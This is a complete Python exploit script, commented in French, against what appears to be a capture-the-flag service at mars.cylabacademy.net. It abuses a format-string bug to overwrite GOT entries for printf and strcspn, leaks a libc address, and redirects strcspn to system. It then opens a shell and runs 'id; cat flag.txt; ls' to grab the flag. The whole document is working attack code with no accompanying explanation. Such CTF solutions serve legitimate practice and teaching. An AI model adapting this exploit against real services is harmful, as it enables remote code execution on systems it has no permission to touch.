import sys, socket, time, struct, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929
PRINTF_GOT = 0x601030
STRCSPN_GOT = 0x601060
READ_GOT = 0x601050
B_READ = 0x4008e8
READ_OFF = 0x111130
SYSTEM_OFF = 0x52290
A0 = b"-1"


def buildB(fmt_body, addrs):
    b = b"1" + fmt_body
    pad = (8 - (len(b) % 8)) % 8
    b += b"P" * pad
    off = len(b)
    for ad in addrs:
        b += struct.pack("<Q", ad)
    # B brut est a la position 42
    pos = [42 + (off // 8) + i for i in range(len(addrs))]
    return b, pos


def make_fmt(dst, value, leak_addr=None, c0=30, nbytes=6):
    vals = [((value >> (8 * i)) & 0xFF, i) for i in range(nbytes)]
    order = sorted(vals)
    addrs = [dst + off for v, off in order]
    if leak_addr is not None:
        addrs.append(leak_addr)
    fmt = b""
    for i in range(len(order)):
        fmt += b"%99c%99$hhn"
    if leak_addr is not None:
        fmt += b"%99$s"
    b, pos = buildB(fmt, addrs)
    fmt = b""
    cur = c0
    for i, (v, off) in enumerate(order):
        need = (v - cur) % 256
        if need == 0:
            need = 256
        cur += need
        fmt += b"%" + str(need).encode() + b"c%" + str(pos[i]).encode() + b"$hhn"
    if leak_addr is not None:
        fmt += b"%" + str(pos[len(order)]).encode() + b"$s"
    b2, pos2 = buildB(fmt, addrs)
    return b2, pos2


print("A0:", A0)
s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(8)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass

# --- passe 1 : loop-back sur la lecture de B + leak read ---
b1, p1 = make_fmt(PRINTF_GOT, B_READ, leak_addr=READ_GOT, c0=30)
print("B1 len:", len(b1), "positions:", p1)
s.sendall(A0 + b"\n"); time.sleep(0.2)
s.sendall(b1 + b"\n"); time.sleep(1.2)
buf = b""
try:
    while True:
        c = s.recv(1 << 16)
        if not c:
            break
        buf += c
except Exception:
    pass
print("passe1 recu:", len(buf), "| 'A: ' count:", buf.count(b"A: "))
j = buf.find(b"PPPP")
leak = buf[j - 6:j]
read_addr = int.from_bytes(leak + b"\x00\x00", "little")
print("leak:", hex(read_addr))
if read_addr < 0x7f0000000000:
    print("leak invalide, sortie")
    s.close()
    sys.exit(1)
base = read_addr - READ_OFF
system = base + SYSTEM_OFF
print("base:", hex(base), "system:", hex(system))

# --- passe 2 : strcspn@got = system ---
b2, p2 = make_fmt(STRCSPN_GOT, system, None, c0=30)
print("B2:", b2[:90], "pos:", p2)
s.sendall(b2 + b"\n"); time.sleep(1.0)
try:
    s.recv(1 << 16)
except Exception:
    pass

# --- passe 3 : B = "sh" -> strcspn(B) = system("sh") ---
s.sendall(b"sh\n"); time.sleep(0.2)
s.sendall(b"id; cat flag.txt; cat /app/flag* 2>/dev/null; ls\n"); time.sleep(1.5)
out = b""
try:
    while True:
        c = s.recv(1 << 16)
        if not c:
            break
        out += c
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print("=== SHELL ===")
print(txt[-1200:])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("\nFLAG:", f.group(0) if f else "non trouve")
s.close()
